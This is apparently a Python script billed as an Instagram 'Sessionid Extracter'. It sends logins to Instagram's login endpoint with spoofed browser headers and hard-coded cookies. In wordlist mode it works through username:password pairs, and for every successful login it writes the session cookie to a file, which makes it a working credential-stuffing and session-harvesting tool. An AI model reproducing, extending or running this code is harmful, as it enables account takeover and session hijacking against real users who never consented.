import requests
from termcolor import colored
import os, sys
os.system('color')
print(colored("""
    ███████╗██╗ ██████╗ █████╗ 
    ██╔════╝██║██╔════╝██╔══██╗
    ███████╗██║███████╗╚██████║
    ╚════██║██║██╔═══██╗╚═══██║
    ███████║██║╚██████╔╝█████╔╝
    ╚══════╝╚═╝ ╚═════╝ ╚════╝                
""", 'red')),print(colored("@1zsb", 'red'))

print("Sessionid Extracter ")
file = "Sessionids.txt"
def check():
    usr = input(colored("[?] Enter The Username : ", 'cyan'))
    if usr == "#$cz69":
        sys.exit()
    pas = input(colored("[?] Enter The Password : ", 'cyan'))
    head = {
        "accept": "*/*",
        "accept-encoding": "gzip, deflate, br",
        "accept-language": "en-US,en;q=0.9",
        "content-length": "313",
        "content-type": "application/x-www-form-urlencoded",
        "cookie": "mid=YjDqDgALAAFA4MUhVNe2Zm3bcQoD; ig_did=F302249E-9B67-4955-AACD-E266D6530AD0; ig_nrcb=1; datr=JOowYnSJlbiWqUOgwqScV4R5; csrftoken=i9GjnZSbwonV7zLrmIOnb9Iv0LZqgxrL",
        "origin": "https://www.instagram.com",
        "referer": "https://www.instagram.com/",
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-origin",
        "sec-gpc": "1",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36",
        "x-asbd-id": "198387",
        "x-csrftoken": "i9GjnZSbwonV7zLrmIOnb9Iv0LZqgxrL",
        "x-ig-app-id": "936619743392459",
        "x-ig-www-claim": "0",
        "x-instagram-ajax": "2296f2f215da",
        "x-requested-with": "XMLHttpRequest"
    }
    data = {
    "enc_password": f"#PWD_INSTAGRAM_BROWSER:0:&:{pas}",
    "username": usr,
    "queryParams": {},
    "optIntoOneTap": "false"
    }

    url = "https://www.instagram.com/accounts/login/ajax/"
    r = requests.post(url, headers=head, data=data)
    if r.text.find('"authenticated":false') >= 0:
        print(colored('[!]', 'red') + colored(' Try Again , Wrong Password', 'red'))
        check()
    elif r.text.find('{"message":"There was an error with your request. Please try again.","status":"fail"}') >= 0:
        print(colored('[!]', 'red') + colored(' Request Error', 'red'))
        check()
    elif r.text.find('authenticated":true') >= 0:
        print(colored('[!]', 'green') + colored(' Login Successfully', 'cyan'))
        print(colored('[!]', 'green') + colored(f" @{usr}: " + r.cookies['sessionid']))
        f = open(file, 'a')
        f.write(f"@{usr}: " + r.cookies['sessionid'] + "\n")
        print(f"Saved in File {file}, Close The Script to load")
        check()
    elif r.text.find('"message":"checkpoint_required"') >= 0:
        print(colored('[!]', 'yellow') + colored(' Secure Checkpoint', 'yellow'))
        check()

def checklist():
    wordlist = input("Wordlist : ")
    with open(wordlist, 'r') as users:
        for tags in users:
            inf = tags.strip()
            usr = inf.split(':')
            head = {
                "accept": "*/*",
                "accept-encoding": "gzip, deflate, br",
                "accept-language": "en-US,en;q=0.9",
                "content-length": "313",
                "content-type": "application/x-www-form-urlencoded",
                "cookie": "mid=YjDqDgALAAFA4MUhVNe2Zm3bcQoD; ig_did=F302249E-9B67-4955-AACD-E266D6530AD0; ig_nrcb=1; datr=JOowYnSJlbiWqUOgwqScV4R5; csrftoken=i9GjnZSbwonV7zLrmIOnb9Iv0LZqgxrL",
                "origin": "https://www.instagram.com",
                "referer": "https://www.instagram.com/",
                "sec-fetch-dest": "empty",
                "sec-fetch-mode": "cors",
                "sec-fetch-site": "same-origin",
                "sec-gpc": "1",
                "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36",
                "x-asbd-id": "198387",
                "x-csrftoken": "i9GjnZSbwonV7zLrmIOnb9Iv0LZqgxrL",
                "x-ig-app-id": "936619743392459",
                "x-ig-www-claim": "0",
                "x-instagram-ajax": "2296f2f215da",
                "x-requested-with": "XMLHttpRequest"
            }
            data = {
            "enc_password": f"#PWD_INSTAGRAM_BROWSER:0:&:{usr[1]}",
            "username": usr[0],
            "queryParams": {},
            "optIntoOneTap": "false"
            }

            url = "https://www.instagram.com/accounts/login/ajax/"
            r = requests.post(url, headers=head, data=data)
            if r.text.find('"authenticated":false') >= 0:
                print(colored('[!]', 'red') + colored(' Try Again , Wrong Password', 'red') + f"--> @{usr[0]}")
            elif r.text.find('{"message":"There was an error with your request. Please try again.","status":"fail"}') >= 0:
                print(colored('[!]', 'red') + colored(' Request Error', 'red') + f"--> @{usr[0]}")
            elif r.text.find('authenticated":true') >= 0:
                print(colored('[!]', 'green') + colored(' Login Successfully', 'cyan') + f"--> @{usr[0]}")
                print(colored('[!]', 'green') + colored(f" @{usr[0]}: " + r.cookies['sessionid']))
                f = open(file, 'a')
                f.write(f"@{usr[0]}: " + r.cookies['sessionid'] + "\n")
            elif r.text.find('"message":"checkpoint_required"') >= 0:
                print(colored('[!]', 'yellow') + colored(' Secure Checkpoint', 'yellow') + f"--> @{usr[0]}")
            else:
                print(colored('[!]', 'red') + colored(' Unknown Error', 'red') + f"--> @{usr[0]}")


print("[ 1 ] USER ")
print("[ 2 ] Wordlist ")
opt = int(input("Option : "))
if opt == 1:
    check()
elif opt == 2:
    checklist()
else:
    print("sorry, i can't find this number!, try again.")

